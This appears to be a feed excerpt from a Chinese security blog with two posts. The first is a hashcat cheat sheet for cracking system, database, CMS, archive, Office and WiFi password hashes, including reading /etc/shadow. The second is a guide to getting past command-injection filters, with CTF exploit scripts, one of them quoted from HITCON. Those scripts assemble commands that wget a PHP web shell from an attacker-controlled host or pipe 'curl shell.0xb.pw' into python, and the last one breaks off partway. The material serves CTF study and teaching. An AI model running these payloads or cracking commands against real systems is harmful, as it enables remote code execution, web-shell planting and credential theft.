?1?1?1?1?1?1?1?1</code></pre><h2 id="1-8位数字-大小写字母-可见特殊符号"><a href="#1-8位数字-大小写字母-可见特殊符号" class="headerlink" title="1-8位数字+大小写字母+可见特殊符号"></a>1-8位数字+大小写字母+可见特殊符号</h2><pre><code>hashcat64.exe -a 3 -1 ?d?u?l?s d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1或者：hashcat64.exe -a 3 d37fc9ee39dd45a7717e3e3e9415f65d --increment --increment-min 1 --increment-max 8 ?a?a?a?a?a?a?a?a</code></pre><h2 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h2><pre><code>-a 0是指定字典破解模式，-o是输出结果到文件中hashcat64.exe -a 0 ede900ac1424436b55dc3c9f20cb97a8 password.txt -o result.txt</code></pre><h2 id="批量破解"><a href="#批量破解" class="headerlink" title="批量破解"></a>批量破解</h2><pre><code>hashcat64.exe -a 0 hash.txt password.txt -o result.txt</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190128214002-36ab009a-2302-1.png" alt="image.png"></p><h2 id="字典组合破解："><a href="#字典组合破解：" class="headerlink" title="字典组合破解："></a>字典组合破解：</h2><pre><code>hashcat64.exe -a 1 25f9e794323b453885f5181f1b624d0b pwd1.txt pwd2.txt</code></pre><h2 id="字典-掩码破解"><a href="#字典-掩码破解" class="headerlink" title="字典+掩码破解"></a>字典+掩码破解</h2><pre><code>hashcat64.exe -a 6 9dc9d5ed5031367d42543763423c24ee password.txt ?l?l?l?l?l</code></pre><h2 id="Mysql4-1-5的PASSWORD函数"><a href="#Mysql4-1-5的PASSWORD函数" class="headerlink" title="Mysql4.1/5的PASSWORD函数"></a>Mysql4.1/5的PASSWORD函数</h2><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129111353-e7ea461a-2373-1.png" alt="image.png"></p><pre><code>hashcat64.exe -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</code></pre><h2 id="sha512crypt-6-SHA512-Unix-破解"><a href="#sha512crypt-6-SHA512-Unix-破解" class="headerlink" title="sha512crypt $6$, SHA512 (Unix)破解"></a>sha512crypt $6$, SHA512 (Unix)破解</h2><p>可以<code>cat /etc/shadow</code>获取</p><pre><code>hashcat64.exe -a 3 -m 1800 --force $6$mxuA5cdy$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew/xd0O0hPG/yrm2X. ?l?l?l?l</code></pre><p>不用整理用户名，使用–username</p><pre><code>hashcat64.exe -a 3 -m 1800 --force qiyou:$6$QDq75ki3$jsKm7qTDHz/xBob0kF1Lp170Cgg0i5Tslf3JW/sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1 ?l?l?l?l?l --username</code></pre><h2 id="Windows-NT-hash，LM-hash破解"><a href="#Windows-NT-hash，LM-hash破解" class="headerlink" title="Windows NT-hash，LM-hash破解"></a>Windows NT-hash，LM-hash破解</h2><p>可以用<code>saminside</code>获取<code>NT-hash,LM-hash</code>的值<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129105751-ab0ebcf0-2371-1.png" alt="image.png"></p><pre><code>NT-hash:hashcat64.exe -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?lLM-hash:hashcat64.exe -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</code></pre><h2 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h2><pre><code>hashcat64.exe -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</code></pre><h2 id="wordpress密码hash破解"><a href="#wordpress密码hash破解" class="headerlink" title="wordpress密码hash破解"></a>wordpress密码hash破解</h2><p>具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数</p><pre><code>hashcat64.exe -a 3 -m 400 --force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/ ?d?d?d?d?d?d</code></pre><h2 id="discuz用户密码hash破解"><a href="#discuz用户密码hash破解" class="headerlink" title="discuz用户密码hash破解"></a>discuz用户密码hash破解</h2><p>其密码加密方式<code>md5(md5($pass).$salt)</code></p><pre><code>hashcat64.exe -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</code></pre><h2 id="破解RAR压缩密码"><a href="#破解RAR压缩密码" class="headerlink" title="破解RAR压缩密码"></a>破解RAR压缩密码</h2><p>首先rar2john获取rar文件hash值<a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z" title="下载地址" target="_blank" rel="noopener">下载地址</a></p><pre><code>获取rar文件的hash值：rar2john.exe 1.rar结果：1.rar:$rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129204720-047d9804-23c4-1.png" alt="image.png"></p><pre><code>hashcat64.exe -a 3 -m 13000 --force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129163411-a6de7830-23a0-1.png" alt="image.png"><br>注意：</p><pre><code>hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：-m参数    类型        示例 hash12500     RAR3-hp    $RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d31713000     RAR5        $rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe</code></pre><h2 id="zip密码破解"><a href="#zip密码破解" class="headerlink" title="zip密码破解"></a>zip密码破解</h2><pre><code>用zip2john获取文件的hash值：zip2john.exe 1.zip结果：1.zip:$zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$/zip2$:::::1.zip-1.txt</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129204743-120aca1e-23c4-1.png" alt="image.png"></p><pre><code>hashcat64.exe -a 3 -m 13600 $zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$/zip2$ --force ?d?d?d?d?d?d</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129164533-3d55655c-23a2-1.png" alt="image.png"></p><h2 id="破解office密码"><a href="#破解office密码" class="headerlink" title="破解office密码"></a>破解office密码</h2><pre><code>获取office的hash值：python office2john.py 11.docx结果：11.docx:$office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129204911-467e16b6-23c4-1.png" alt="image.png"></p><pre><code>hashcat64.exe -a 3 -m 9600 $office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 --force ?d?d?d?d?d?d</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129165754-f7280e66-23a3-1.png" alt="image.png"></p><h2 id="破解WIFI密码"><a href="#破解WIFI密码" class="headerlink" title="破解WIFI密码"></a>破解WIFI密码</h2><p>首先先把我们的握手包转化为<code>hccapx</code>格式，现在最新版的<code>hashcat</code>只支持<code>hccapx</code>格式了，以前的<code>hccap</code>格式已经不支持了</p><pre><code>官方在线转化https://hashcat.net/cap2hccapx/</code></pre><pre><code>hashcat64.exe -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190129172412-a3e3e92e-23a7-1.png" alt="image.png"></p><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><ol><li>对于破解过的hash值，用<code>hashcat64.exe hash --show</code>查看结果</li><li>所有的hash破解结果都在hashcat.potfile文件中</li><li>如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解。</li><li>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</li><li>在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源<pre><code>1.首先走一遍常用的弱口令字典2.组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已3.把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解4.如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失</code></pre>6.HashCat参数优化<br>考虑到hashcat的破解速度以及资源的分配，我们可以对一些参数进行配置<br> 1.Workload tuning 负载调优。<br> 该参数支持的值有1,8,40,80,160<pre><code> --gpu-accel 160 可以让GPU发挥最大性能。</code></pre> 2.Gpu loops 负载微调<br> 该参数支持的值的范围是8-1024（有些算法只支持到1000）。<pre><code> --gpu-loops 1024 可以让GPU发挥最大性能。</code></pre> 3.Segment size 字典缓存大小<br> 该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越块了。<pre><code> --segment-size 512 可以提高大字典破解的速度。</code></pre></li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://hashcat.net/wiki/doku.php?id=hashcat" title="Hashcat的Wiki" target="_blank" rel="noopener">Hashcat Wiki</a><br><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" title="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass一些命令注入限制的姿势</title>
      <link href="/2019/02/01/Bypass%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%99%90%E5%88%B6%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
      <url>/2019/02/01/Bypass%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E9%99%90%E5%88%B6%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于设置社区<a href="https://xz.aliyun.com/t/3918" target="_blank" rel="noopener">https://xz.aliyun.com/t/3918</a></p></blockquote><h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>OS命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>说到命令注入，我们不得不提到命令注入中几个常用的符号。</p><h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><pre><code>语法格式如下：command1 &amp;&amp; command2 [&amp;&amp; command3 ...]1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。</code></pre><h2 id="管道符号"><a href="#管道符号" class="headerlink" title="|(管道符号)"></a>|(管道符号)</h2><pre><code>| 表示管道，上一条命令的输出，作为下一条命令的参数</code></pre><h2 id=""><a href="#" class="headerlink" title="||"></a>||</h2><pre><code>语法格式如下：command1 || command2 [|| command3 ...]1 命令之间使用 || 连接，实现逻辑或的功能。2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。</code></pre><h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><pre><code>&amp; 表示将任务置于后台执行</code></pre><h2 id="分号"><a href="#分号" class="headerlink" title=";(分号)"></a>;(分号)</h2><pre><code>多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</code></pre><h2 id="和"><a href="#和" class="headerlink" title="``和$()"></a>``和$()</h2><pre><code>在bash中，$( )与` `（反引号）都是用来作命令替换的。各自的优缺点：1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。2. $()更有可读性，但是$()并不是所有shell都支持。</code></pre><h2 id="和-1"><a href="#和-1" class="headerlink" title="()和{}"></a>()和{}</h2><pre><code>如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。(command1;command2;command3....){ command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号相同点：()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开不同点()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行()最后一个命令可以不用分号,{}最后一个命令要用分号()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令</code></pre><h2 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h2><p>来自菜鸟教程：</p><pre><code>大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</code></pre><pre><code>命令说明：command &gt; file：将输出重定向到 file。command &lt; file：将输入重定向到 file。command &gt;&gt; file：将输出以追加的方式重定向到 file。n &gt; file：将文件描述符为 n 的文件重定向到 file。n &gt;&gt; file：将文件描述符为 n 的文件以追加的方式重定向到 file。n &gt;&amp; m：将输出文件 m 和 n 合并。n &lt;&amp; m：将输入文件 m 和 n 合并。&lt;&lt; tag：将开始标记 tag 和结束标记 tag 之间的内容作为输入。需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</code></pre><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><pre><code>^匹配输入字符串的开始位置。$匹配输入字符串的结束位置。*匹配前面的子表达式零次或多次+匹配前面的子表达式一次或多次。?匹配前面的子表达式零次或一次。{n}n 是一个非负整数。匹配确定的 n 次。{n,}n 是一个非负整数。至少匹配n 次。{n,m}m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。?当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。.匹配除换行符（\n、\r）之外的任何单个字符。[xyz]字符集合。匹配所包含的任意一个字符。</code></pre><p>还有一些内置的通用字符簇</p><pre><code>[[:alpha:]] 任何字母[[:digit:]] 任何数字[[:alnum:]] 任何字母和数字[[:space:]] 任何空白字符[[:upper:]] 任何大写字母[[:lower:]] 任何小写字母[[:punct:]] 任何标点符号[[:xdigit:]] 任何16进制的数字，相当于[0-9a-fA-F]</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="一些常见的限制"><a href="#一些常见的限制" class="headerlink" title="一些常见的限制"></a>一些常见的限制</h2><h3 id="通配符-和-的使用"><a href="#通配符-和-的使用" class="headerlink" title="通配符*和?的使用"></a>通配符<code>*</code>和<code>?</code>的使用</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174451-083fa032-1c98-1.png" alt="image.png"></p><h3 id="和-的使用"><a href="#和-的使用" class="headerlink" title="[]和{}的使用"></a>[]和{}的使用</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174709-5a7fea96-1c98-1.png" alt="image.png"></p><p>{…}与[…]有一个很重要的区别。如果匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120174912-a3cd3eba-1c98-1.png" alt="image.png"></p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>使用&lt;和&gt;</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120175948-1f648e6a-1c9a-1.png" alt="image.png"></p><p>使用特殊变量:<code>$IFS</code></p><pre><code>IFS的默认值为：空白（包括：空格，tab, 和新行)</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180235-82c6e07a-1c9a-1.png" alt="image.png"></p><h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9),<code>${x}</code>(x&gt;=10)<br>PS：因为在没有传参的情况下，上面的特殊变量都是为空的<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180631-0f960c1a-1c9b-1.png" alt="image.png"></p><p>使用反斜杠</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180724-2eeda8de-1c9b-1.png" alt="image.png"></p><p>使用变量</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120180945-82ca6a28-1c9b-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120183457-0887a146-1c9f-1.png" alt="image.png"></p><p>使用特殊变量${9}</p><pre><code>${9}对应空字符串</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181515-47fd220e-1c9c-1.png" alt="image.png"></p><p>使用编码<br>base64<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181135-c499e8ca-1c9b-1.png" alt="image.png"><br>16进制<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120182144-2fae337c-1c9d-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185231-7cab65c4-1ca1-1.png" alt="image.png"></p><p>8进制<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120185020-2e5c14cc-1ca1-1.png" alt="image.png"></p><p>使用双引号和单引号</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120181255-f41fd258-1c9b-1.png" alt="image.png"></p><p>花括号还有一种用法：{command,argument}，</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120205644-d68d3ee4-1cb2-1.png" alt="image.png"></p><p>使用<code>%0a(\n)</code>，<code>%0d(\r)</code>，<code>%09(\t)</code>等字符也可以bypass一些过滤，这里就会不多去赘述了</p><h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>很简单，长度不能大于等于17，直接在eval里面再用一个eval就可以了。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120211733-bf383cdc-1cb5-1.png" alt="image.png"></p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这里要用到我们前面所讲到的重定向，<code>n &gt; file</code>：将文件描述符为 n 的文件重定向到 file。<br>既然我们不能一次执行一条完整的命令，我们可以分为多次<br>举个简单的例子</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120221721-1a28f340-1cbe-1.png" alt="image.png"></p><p>ls是默认以文件名排序的，所以我们为了控制我们命令的顺序，可以使用ls -t按时间逆序。<br>不过这里考虑到直接写shell有点麻烦（因为php中的一些符号用到shell中是有意义的，要各种转义，为了节省代码量我们直接用curl或者是wget从服务器dump一个shell下来）<br>exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsname<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">">php\\"</span><span class="token punctuation">,</span><span class="token string">">\\ 1.\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ -O\\\\"</span><span class="token punctuation">,</span><span class="token string">">cn\\\\"</span><span class="token punctuation">,</span><span class="token string">">\\ a.\\\\"</span><span class="token punctuation">,</span><span class="token string">">wget\\\\"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#可以修改hosts文件，让a.cn指向一个自己的服务器。</span><span class="token comment" spellcheck="true">#index.html是一个php的shell</span>url<span class="token operator">=</span><span class="token string">"http://192.168.163.128/test.php"</span><span class="token keyword">for</span> x <span class="token keyword">in</span> name<span class="token punctuation">:</span>    <span class="token keyword">print</span> x    param<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span>x<span class="token punctuation">}</span>    a<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param<span class="token punctuation">)</span>param1<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'ls -t>a'</span><span class="token punctuation">}</span>param2<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'sh a'</span><span class="token punctuation">}</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param1<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>param2<span class="token punctuation">)</span>b<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://192.168.163.128/1.php"</span><span class="token punctuation">)</span><span class="token keyword">if</span> b<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"ok!"</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"bad!"</span></code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190120235756-271eed3a-1ccc-1.png" alt="image.png"><br>可以发现成功写了shell</p><h3 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h3><p>HITCON CTF 2017-BabyFirst Revenge</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这个字符长度限制不能大于5个，我们写字符还是可以的，但是我们的<code>ls -t&gt;a</code>用不了，不过我们可以用前面的思路，把<code>ls -t&gt;a</code>拆分为几段放在一个文件中，然后再执行。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190121100854-811f807e-1d21-1.png" alt="image.png"><br>可以发现2-5行是可以执行<code>ls -t&gt;g</code>的，然后后面的步骤就和前面一题一样了，这里就不多赘述了<br>贴一下Orange师傅的exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> urllib <span class="token keyword">import</span> quotepayload <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>   <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>   <span class="token string">'ls>_'</span><span class="token punctuation">,</span>   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>   <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>   <span class="token string">'>\>g'</span><span class="token punctuation">,</span>   <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw>python`</span>   <span class="token comment" spellcheck="true"># curl shell.0xb.pw|python</span>   <span class="token string">'>on'</span><span class="token punctuation">,</span>   <span class="token string">'>th\\'</span><span class="token punctuation">,</span>   <span class="token string">'>py\\'</span><span class="token punctuation">,</span>   <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>   <span class="token string">'>pw\\'</span><span class="token punctuation">,</span>   <span class="token string">'>x.\\'</span><span class="token punctuation">,</span>   <span class="token string">'>xx\\'</span><span class="token punctuation">,</span>   <span class="token string">'>l.\\'</span><span class="token punctuation">,</span>   <span class="token string">'>el\\'</span><span class="token punctuation">,</span>   <span class="token string">'>sh\\'</span><span class="token punctuation">,</span>   <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>   <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>   <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true"># exec</span>   <span class="token string">'sh _'</span><span class="token punctuation">,</span>   <span class="token string">'sh g'</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># r = requests.get('http://localhost/tmp/?reset=1')</span><span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>   <span class="token keyword">assert</span> len<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span>   r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://localhost/tmp/?cmd='</span> <span class="token operator">+</span> quote<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">)</span>   <span class="token keyword">print</span> i   